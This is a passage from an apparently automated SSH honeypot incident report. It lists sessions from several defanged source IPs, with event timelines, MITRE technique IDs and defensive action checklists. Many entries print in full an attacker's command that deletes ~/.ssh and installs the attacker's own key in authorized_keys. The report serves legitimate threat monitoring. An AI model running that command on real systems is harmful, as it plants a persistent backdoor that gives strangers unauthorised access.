- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a92acdb77be8

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:15 |
| **Last Seen** | 2026-06-09 09:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:15:29` | `cowrie.session.connect` |
| `2026-06-09 09:15:29` | `cowrie.client.version` |
| `2026-06-09 09:15:29` | `cowrie.client.kex` |
| `2026-06-09 09:15:30` | `cowrie.login.success` |
| `2026-06-09 09:15:30` | `cowrie.session.params` |
| `2026-06-09 09:15:30` | `cowrie.command.input` |
| `2026-06-09 09:15:30` | `cowrie.command.failed` |
| `2026-06-09 09:15:30` | `cowrie.log.closed` |
| `2026-06-09 09:15:30` | `cowrie.session.params` |
| `2026-06-09 09:15:30` | `cowrie.command.input` |
| `2026-06-09 09:15:30` | `cowrie.session.file_download` |
| `2026-06-09 09:15:30` | `cowrie.log.closed` |
| `2026-06-09 09:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a857342c438

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:15 |
| **Last Seen** | 2026-06-09 09:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:15:32` | `cowrie.session.connect` |
| `2026-06-09 09:15:32` | `cowrie.client.version` |
| `2026-06-09 09:15:32` | `cowrie.client.kex` |
| `2026-06-09 09:15:33` | `cowrie.login.success` |
| `2026-06-09 09:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-266952de6669

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:15 |
| **Last Seen** | 2026-06-09 09:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:15:50` | `cowrie.session.connect` |
| `2026-06-09 09:15:50` | `cowrie.client.version` |
| `2026-06-09 09:15:51` | `cowrie.client.kex` |
| `2026-06-09 09:15:52` | `cowrie.login.success` |
| `2026-06-09 09:15:52` | `cowrie.session.params` |
| `2026-06-09 09:15:52` | `cowrie.command.input` |
| `2026-06-09 09:15:52` | `cowrie.command.failed` |
| `2026-06-09 09:15:53` | `cowrie.log.closed` |
| `2026-06-09 09:15:53` | `cowrie.session.params` |
| `2026-06-09 09:15:53` | `cowrie.command.input` |
| `2026-06-09 09:15:53` | `cowrie.session.file_download` |
| `2026-06-09 09:15:53` | `cowrie.log.closed` |
| `2026-06-09 09:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e443385e783f

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:15 |
| **Last Seen** | 2026-06-09 09:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:15:57` | `cowrie.session.connect` |
| `2026-06-09 09:15:57` | `cowrie.client.version` |
| `2026-06-09 09:15:57` | `cowrie.client.kex` |
| `2026-06-09 09:15:58` | `cowrie.login.success` |
| `2026-06-09 09:15:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.217.253[.]190` to AbuseIPDB if not already reported
- [ ] Block `154.217.253[.]190` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-60c51992749d

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:19 |
| **Last Seen** | 2026-06-09 09:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:19:15` | `cowrie.session.connect` |
| `2026-06-09 09:19:15` | `cowrie.client.version` |
| `2026-06-09 09:19:15` | `cowrie.client.kex` |
| `2026-06-09 09:19:17` | `cowrie.login.success` |
| `2026-06-09 09:19:17` | `cowrie.session.params` |
| `2026-06-09 09:19:17` | `cowrie.command.input` |
| `2026-06-09 09:19:17` | `cowrie.command.failed` |
| `2026-06-09 09:19:18` | `cowrie.log.closed` |
| `2026-06-09 09:19:18` | `cowrie.session.params` |
| `2026-06-09 09:19:18` | `cowrie.command.input` |
| `2026-06-09 09:19:19` | `cowrie.session.file_download` |
| `2026-06-09 09:19:19` | `cowrie.log.closed` |
| `2026-06-09 09:19:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a40bd5e0d864

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:19 |
| **Last Seen** | 2026-06-09 09:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:19:22` | `cowrie.session.connect` |
| `2026-06-09 09:19:22` | `cowrie.client.version` |
| `2026-06-09 09:19:23` | `cowrie.client.kex` |
| `2026-06-09 09:19:24` | `cowrie.login.success` |
| `2026-06-09 09:19:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22b733866673

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:19 |
| **Last Seen** | 2026-06-09 09:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:19:27` | `cowrie.session.connect` |
| `2026-06-09 09:19:27` | `cowrie.client.version` |
| `2026-06-09 09:19:27` | `cowrie.client.kex` |
| `2026-06-09 09:19:28` | `cowrie.login.success` |
| `2026-06-09 09:19:28` | `cowrie.session.params` |
| `2026-06-09 09:19:28` | `cowrie.command.input` |
| `2026-06-09 09:19:28` | `cowrie.command.failed` |
| `2026-06-09 09:19:28` | `cowrie.log.closed` |
| `2026-06-09 09:19:29` | `cowrie.session.params` |
| `2026-06-09 09:19:29` | `cowrie.command.input` |
| `2026-06-09 09:19:29` | `cowrie.session.file_download` |
| `2026-06-09 09:19:29` | `cowrie.log.closed` |
| `2026-06-09 09:19:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fff54a9a6b03

| Field | Detail |
|---|---|
| **Source IP** | `81.192.46[.]49` |
| **First Seen** | 2026-06-09 09:19 |
| **Last Seen** | 2026-06-09 09:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:19:31` | `cowrie.session.connect` |
| `2026-06-09 09:19:31` | `cowrie.client.version` |
| `2026-06-09 09:19:31` | `cowrie.client.kex` |
| `2026-06-09 09:19:31` | `cowrie.login.success` |
| `2026-06-09 09:19:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.192.46[.]49` to AbuseIPDB if not already reported
- [ ] Block `81.192.46[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce202b984503

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:19 |
| **Last Seen** | 2026-06-09 09:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:19:31` | `cowrie.session.connect` |
| `2026-06-09 09:19:31` | `cowrie.client.version` |
| `2026-06-09 09:19:31` | `cowrie.client.kex` |
| `2026-06-09 09:19:31` | `cowrie.login.success` |
| `2026-06-09 09:19:32` | `cowrie.session.params` |
| `2026-06-09 09:19:32` | `cowrie.command.input` |
| `2026-06-09 09:19:32` | `cowrie.command.failed` |
| `2026-06-09 09:19:32` | `cowrie.log.closed` |
| `2026-06-09 09:19:32` | `cowrie.session.params` |
| `2026-06-09 09:19:32` | `cowrie.command.input` |
| `2026-06-09 09:19:32` | `cowrie.session.file_download` |
| `2026-06-09 09:19:32` | `cowrie.log.closed` |
| `2026-06-09 09:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-737b0bc16e40

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:19 |
| **Last Seen** | 2026-06-09 09:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:19:34` | `cowrie.session.connect` |
| `2026-06-09 09:19:34` | `cowrie.client.version` |
| `2026-06-09 09:19:34` | `cowrie.client.kex` |
| `2026-06-09 09:19:35` | `cowrie.login.success` |
| `2026-06-09 09:19:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03d8926a7d09

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:21 |
| **Last Seen** | 2026-06-09 09:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:21:02` | `cowrie.session.connect` |
| `2026-06-09 09:21:02` | `cowrie.client.version` |
| `2026-06-09 09:21:03` | `cowrie.client.kex` |
| `2026-06-09 09:21:04` | `cowrie.login.success` |
| `2026-06-09 09:21:04` | `cowrie.session.params` |
| `2026-06-09 09:21:04` | `cowrie.command.input` |
| `2026-06-09 09:21:04` | `cowrie.command.failed` |
| `2026-06-09 09:21:05` | `cowrie.log.closed` |
| `2026-06-09 09:21:05` | `cowrie.session.params` |
| `2026-06-09 09:21:05` | `cowrie.command.input` |
| `2026-06-09 09:21:05` | `cowrie.session.file_download` |
| `2026-06-09 09:21:05` | `cowrie.log.closed` |
| `2026-06-09 09:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe90440e7820

| Field | Detail |
|---|---|
| **Source IP** | `43.166.137[.]151` |
| **First Seen** | 2026-06-09 09:21 |
| **Last Seen** | 2026-06-09 09:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:21:08` | `cowrie.session.connect` |
| `2026-06-09 09:21:08` | `cowrie.client.version` |
| `2026-06-09 09:21:09` | `cowrie.client.kex` |
| `2026-06-09 09:21:10` | `cowrie.login.success` |
| `2026-06-09 09:21:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.166.137[.]151` to AbuseIPDB if not already reported
- [ ] Block `43.166.137[.]151` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f5c9dcbc666

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:21 |
| **Last Seen** | 2026-06-09 09:21 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:21:20` | `cowrie.session.connect` |
| `2026-06-09 09:21:20` | `cowrie.client.version` |
| `2026-06-09 09:21:21` | `cowrie.client.kex` |
| `2026-06-09 09:21:21` | `cowrie.login.success` |
| `2026-06-09 09:21:21` | `cowrie.session.params` |
| `2026-06-09 09:21:21` | `cowrie.command.input` |
| `2026-06-09 09:21:21` | `cowrie.command.failed` |
| `2026-06-09 09:21:21` | `cowrie.log.closed` |
| `2026-06-09 09:21:22` | `cowrie.session.params` |
| `2026-06-09 09:21:22` | `cowrie.command.input` |
| `2026-06-09 09:21:22` | `cowrie.session.file_download` |
| `2026-06-09 09:21:22` | `cowrie.log.closed` |
| `2026-06-09 09:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e2ae80d7ae5

| Field | Detail |
|---|---|
| **Source IP** | `45.160.84[.]79` |
| **First Seen** | 2026-06-09 09:21 |
| **Last Seen** | 2026-06-09 09:21 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:21:21` | `cowrie.session.connect` |
| `2026-06-09 09:21:21` | `cowrie.client.version` |
| `2026-06-09 09:21:21` | `cowrie.client.kex` |
| `2026-06-09 09:21:22` | `cowrie.login.success` |
| `2026-06-09 09:21:23` | `cowrie.session.params` |
| `2026-06-09 09:21:23` | `cowrie.command.input` |
| `2026-06-09 09:21:23` | `cowrie.command.failed` |
| `2026-06-09 09:21:24` | `cowrie.log.closed` |
| `2026-06-09 09:21:24` | `cowrie.session.params` |
| `2026-06-09 09:21:24` | `cowrie.command.input` |
| `2026-06-09 09:21:24` | `cowrie.session.file_download` |
| `2026-06-09 09:21:24` | `cowrie.log.closed` |
| `2026-06-09 09:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.160.84[.]79` to AbuseIPDB if not already reported
- [ ] Block `45.160.84[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b0c0b2d81b4

| Field | Detail |
|---|---|
| **Source IP** | `152.32.252[.]65` |
| **First Seen** | 2026-06-09 09:21 |
| **Last Seen** | 2026-06-09 09:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:21:24` | `cowrie.session.connect` |
| `2026-06-09 09:21:24` | `cowrie.client.version` |
| `2026-06-09 09:21:24` | `cowrie.client.kex` |
| `2026-06-09 09:21:24` | `cowrie.login.success` |
| `2026-06-09 09:21:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.252[.]65` to AbuseIPDB if not already reported
- [ ] Block `152.32.252[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0065ebf4dd4f

| Field | Detail |
|---|---|
| **Source IP** | `154.217.253[.]190` |
| **First Seen** | 2026-06-09 09:21 |
| **Last Seen** | 2026-06-09 09:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-09 09:21:27` | `cowrie.session.connect` |
| `2026-06-09 09:21:27` | `cowrie.client.version` |
| `2026-06-09 09:21:28` | `cowrie.client.kex` |
| `2026-06-09 09:21:29` | `cowrie.login.success` |
| `2026-06-09 09:21:29` | `cowrie.session.params` |
| `2026-06-09 09:21:29` | `cowrie.command.input` |
| `2026-06-09 09:21:29` | `cowrie.command.failed` |
| `2026-06-09 09:21:30` | `cowrie.log.closed` |
| `2026-06-09 09:21:30` | `cowrie.session.params` |
| `2026-06-09 09:21:30` | `cowrie.command.input` |
| `2026-06-09 09:21:31` | `cowrie.session.file_download` |
| `2026-06-09 09:21:31` | `cowrie.log.closed` |
| `2026-06-09 09:21:35` | `cowrie.session.closed` |

**Recommended Actions:**
